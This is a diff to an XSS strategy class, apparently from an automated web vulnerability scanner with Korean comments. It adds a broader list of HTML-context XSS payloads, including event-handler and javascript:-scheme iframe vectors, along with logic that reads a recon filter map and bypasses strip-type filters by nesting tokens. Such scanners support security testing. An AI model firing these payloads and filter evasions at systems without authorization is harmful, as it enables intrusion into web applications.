@@ -77,10 +77,21 @@ class XSSStrategy(BaseStrategy):
     #               스킵한다. recon은 꺾쇠(<,>)만 재므로 따옴표 요구는 ③ exec_sig로 거른다.
     # alert 따옴표는 컨텍스트 breakout 따옴표와 겹치지 않게 고른다.
     _CONTEXT_PAYLOADS: dict[str, list[tuple[str, str, frozenset]]] = {
-        # 태그 사이 텍스트 — 바로 태그 주입
+        # 태그 사이 텍스트 — 바로 태그 주입. 태그/핸들러를 다양화해, 특정 태그·핸들러만 막는
+        # 필터를 '안 막힌 벡터를 측정으로 골라' 우회한다(흔한→exotic 순). 괄호 차단은 벡터를
+        # 늘리지 않고 waf.paren_to_backtick 변형이 처리한다.
         'html': [
-            ("<img src=x onerror=alert('{M}')>", "<img src=x onerror=alert('{M}')", frozenset({'<', '>'})),
-            ("<svg/onload=alert('{M}')>",        "<svg/onload=alert('{M}')",        frozenset({'<', '>'})),
+            ("<img src=x onerror=alert('{M}')>",       "<img src=x onerror=alert('{M}')",     frozenset({'<', '>'})),
+            ("<svg/onload=alert('{M}')>",              "<svg/onload=alert('{M}')",            frozenset({'<', '>'})),
+            ("<body onload=alert('{M}')>",             "<body onload=alert('{M}')",           frozenset({'<', '>'})),
+            ("<input autofocus onfocus=alert('{M}')>", "<input autofocus onfocus=alert('{M}')", frozenset({'<', '>'})),
+            ("<details open ontoggle=alert('{M}')>",   "<details open ontoggle=alert('{M}')", frozenset({'<', '>'})),
+            ("<marquee onstart=alert('{M}')>",         "<marquee onstart=alert('{M}')",       frozenset({'<', '>'})),
+            ("<video><source onerror=alert('{M}')>",   "<source onerror=alert('{M}')",        frozenset({'<', '>'})),
+            # on-free 벡터 — javascript: 스킴을 iframe이 자동 네비게이션해 실행(이벤트 핸들러 無).
+            # 'on*' 전체를 막는 필터를 피한다. 'javascript'/'('가 막히면 url_scheme_sep/backtick
+            # 변형이 측정으로 붙는다(iframe은 운반체, 실행은 javascript: 스킴).
+            ('<iframe src="javascript:alert(\'{M}\')">', '<iframe src="javascript:alert(\'{M}\')', frozenset({'<', '>'})),
         ],
         # 겹따옴표 속성값 — "> 로 빠져나옴 (alert는 홑따옴표)
         'attr_double': [
@@ -169,6 +180,16 @@ class XSSStrategy(BaseStrategy):
 
         base_fields = self._base_fields(surface)
 
+        # recon이 '막힘'(removed/rejected)으로 확인한 토큰 — 이걸 '쓰는' 페이로드는 필터에 걸린다.
+        # 변형(case-mix 등)으로 없앨 수 있는 토큰('on' 등)은 아래 우회 단계가 측정으로 처리하고,
+        # 어떤 변형으로도 못 없애는 구조 토큰('(' ')' 등)을 쓰는 페이로드는 발사 전 스킵한다.
+        filter_map = surface.extra.get('filter_map') or {}
+        banned = {t for t, o in filter_map.items() if o in ('removed', 'rejected')}
+        # strip(제거형)으로 걸린 토큰 — 중첩(nesting) 우회가 통할 수 있는 토큰. reject형은 제외.
+        stripped = {t for t, o in filter_map.items() if o == 'removed'}
+        if banned:
+            print(f"    [XSS] recon 필터 지도: 막힌 토큰 {sorted(banned)} — 안 쓰는 변형/벡터로 우회 시도")
+
         # baseline — 마커가 원래 페이지에 이미 있었는지 확인용(사전존재 오탐 방지)
         status, baseline_body, _ = self._send(surface, dict(base_fields))
         if status is None:
@@ -188,6 +209,13 @@ class XSSStrategy(BaseStrategy):
                 if marker in baseline_body:
                     continue  # 극히 드문 충돌 — 안전하게 스킵
                 payload = template.format(M=marker)
+                # 막힌 토큰 중 '어떤 변형으로도 못 없애는'(구조적: '(' ')' 등) 걸 이 페이로드가
+                # 쓰면 보내봐야 필터되니 발사 전 스킵. 변형으로 없앨 수 있는 토큰('on' 등)은
+                # 아래 우회 단계가 측정으로 처리하므로 여기서 안 막는다.
+                dead_ban = [t for t in banned if t in payload and not self._transform_can_drop(payload, t)]
+                if dead_ban:
+                    print(f"      · {ctx}: 막힌 토큰 {dead_ban} 포함 — 변형으로 제거 불가(구조적), 스킵")
+                    continue
                 exec_sig = sig_template.format(M=marker)
                 cand = {
                     'context': ctx,
@@ -220,7 +248,7 @@ class XSSStrategy(BaseStrategy):
                 # 꺾쇠는 살아남아(프루닝 통과) 여기 왔는데 exec_sig가 안 남았다 = 핸들러/태그
                 # 키워드가 필터에 변형/제거된 것(출력 인코딩이면 애초에 프루닝됐을 것). 반사는
                 # 되니 일반 변형(대소문자/공백)으로 '원형 생존'하는 변형을 측정으로 찾는다.
-                evaded = self._try_evade_payload(surface, base_fields, ctx, template, sig_template, marker)
+                evaded = self._try_evade_payload(surface, base_fields, ctx, template, sig_template, marker, stripped)
                 if evaded:
                     candidates.append(evaded)
                     break
@@ -263,22 +291,37 @@ class XSSStrategy(BaseStrategy):
 
     # ── 필터 우회 (SQLi _try_evade와 같은 구조, predicate만 다름) ──────────────
 
-    def _try_evade_payload(self, surface: AttackSurface, base_fields: dict, ctx: str,
-                           template: str, sig_template: str, marker: str) -> dict | None:
-        """기본 페이로드가 필터돼 exec_sig가 원형으로 안 남을 때, 일반 변형(XSS_EVASION_TRANSFORMS:
-        키워드 대소문자·공백→탭)을 적용해 '원형 생존'하는 변형을 측정으로 찾는다.
+    def _transform_can_drop(self, payload: str, tok: str) -> bool:
+        """XSS 변형(XSS_EVASION_TRANSFORMS) 중 하나라도 payload에서 tok을 '리터럴로' 없애면 True.
+        case-mix는 소문자 'on'을 'On'으로 바꿔 리터럴 'on'을 없앤다(strip형 필터 우회 가능).
+        반면 '(' ')' 같은 구조 토큰은 어떤 변형도 못 없애므로 False → 그 토큰이 막혔으면
+        이 페이로드로는 우회 불가(발사 전 스킵 판단에 쓴다)."""
+        return any(tok not in transform(payload) for _, transform in XSS_EVASION_TRANSFORMS)
 
-        SQLi._try_evade와 구조는 같다 — 변형 세트를 적용해 보내고 생존을 판정. 다른 건
-        predicate뿐: SQL은 '거부됐나', XSS는 '변형된 exec_sig가 응답에 원형으로 남았나'.
-        변형은 marker/alert(JS)를 건드리지 않으므로, 살아남으면 그대로 브라우저 확정으로 넘어간다.
-        (대체 벡터 다양화는 범위 밖 — 변형만.)"""
+    def _try_evade_payload(self, surface: AttackSurface, base_fields: dict, ctx: str,
+                           template: str, sig_template: str, marker: str,
+                           stripped: set) -> dict | None:
+        """기본 페이로드가 필터돼 exec_sig가 원형으로 안 남을 때, 변형을 적용해 '원형 생존'하는
+        변형을 측정으로 찾는다. 변형 소스는 두 갈래:
+          · 일반 변형(XSS_EVASION_TRANSFORMS): 키워드 대소문자·공백→탭·괄호→백틱
+          · 중첩(nesting): strip(제거형)으로 걸린 토큰을 자기 안에 끼워, 단일패스 replace가
+            다시 토큰을 만들게 함(예: 'on'→'oonn'→필터 후 'on'). reject형엔 안 통하므로
+            'removed'(앵커 생존=strip) 토큰만 중첩한다.
+
+        SQLi._try_evade와 구조 동일 — 다른 건 predicate뿐: 'exec_sig가 응답에 원형 생존하나'.
+        변형은 marker/alert(JS)를 안 건드리므로, 살아남으면 그대로 브라우저 확정으로 넘어간다."""
         base_payload = template.format(M=marker)
         base_sig = sig_template.format(M=marker)
-        for name, transform in XSS_EVASION_TRANSFORMS:
-            v_payload = transform(base_payload)
+
+        # (변형이름, 변형 payload, 변형 exec_sig) 후보 목록
+        variants = [(name, tf(base_payload), tf(base_sig)) for name, tf in XSS_EVASION_TRANSFORMS]
+        for tok in stripped:
+            if len(tok) >= 2 and tok in base_payload:   # 단일문자는 중첩해도 replace-all로 다 지워짐
+                variants.append((f"nest:{tok}", self._nest(base_payload, tok), self._nest(base_sig, tok)))
+
+        for name, v_payload, v_sig in variants:
             if v_payload == base_payload:
                 continue  # 이 변형이 아무것도 안 바꿈 — 요청 아낌
-            v_sig = transform(base_sig)
             p_status, p_body, _ = self._send(surface, {**base_fields, surface.param: v_payload})
             if p_status is None:
                 continue
@@ -292,17 +335,14 @@ class XSSStrategy(BaseStrategy):
                         'fields': {**base_fields, surface.param: v_payload}}
         return None
 
-    # ── 요청 전송 ────────────────────────────────────────────────────────────
+    @staticmethod
+    def _nest(s: str, token: str) -> str:
+        """token을 자기 안에 끼워, 단일패스 replace(token,'')가 다시 token을 만들게 한다
+        (예: 'on'→'oonn', 'script'→'sscriptcript'). strip형 필터 우회용 — 첫 occurrence만."""
+        nested = token[:1] + token + token[1:]
+        return s.replace(token, nested, 1)
 
-    def _base_fields(self, surface: AttackSurface) -> dict:
-        """target 필드와 함께 보낼 나머지 필드의 기본값(SQLiStrategy._base_fields와 동일 규칙)."""
-        if surface.surface_type == 'url_param':
-            raw = (surface.page or {}).get('params') or {}
-            data = {k: (v[0] if isinstance(v, list) and v else 'test') for k, v in raw.items()}
-        else:
-            data = dict(surface.extra.get('all_params') or {})
-        data.setdefault(surface.param, 'test')
-        return data
+    # ── 요청 전송 ────────────────────────────────────────────────────────────
 
     def _send(self, surface: AttackSurface, data: dict, timeout: int | None = None):
         """(status, body, elapsed) — 실패 시 (None, '', 0.0)."""
